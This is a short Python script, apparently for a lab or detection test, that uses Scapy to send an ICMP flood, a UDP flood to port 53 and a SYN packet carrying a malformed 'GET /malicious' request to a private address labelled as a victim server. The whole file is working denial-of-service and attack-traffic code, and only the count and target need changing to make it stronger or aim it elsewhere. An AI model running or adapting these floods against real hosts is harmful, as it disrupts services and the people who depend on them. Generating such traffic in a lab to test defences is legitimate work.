from scapy.all import *
import time

# Target IP（victim-server）
target_ip = "172.21.0.10"

# ========== 1. ICMP Flood ==========
def icmp_flood(count=100):
    print("[*] Starting ICMP Flood...")
    for i in range(count):
        pkt = IP(dst=target_ip)/ICMP()
        send(pkt, verbose=0)
    print("[+] ICMP Flood completed.")

# ========== 2. UDP Flood ==========
def udp_flood(count=100):
    print("[*] Starting UDP Flood...")
    for i in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=53)/Raw(load="A"*100)
        send(pkt, verbose=0)
    print("[+] UDP Flood completed.")

# ========== 3. Abnormal HTTP (raw TCP) ==========
def http_attack():
    print("[*] Sending abnormal HTTP request...")
    pkt = IP(dst=target_ip)/TCP(dport=80, flags="S")/Raw(load="GET /malicious HTTP/1.1\r\nHost: victim\r\n\r\n")
    send(pkt, verbose=0)
    print("[+] Abnormal HTTP request sent.")

# ========== Main Program ==========
if __name__ == "__main__":
    icmp_flood()
    time.sleep(2)
    udp_flood()
    time.sleep(2)
    http_attack()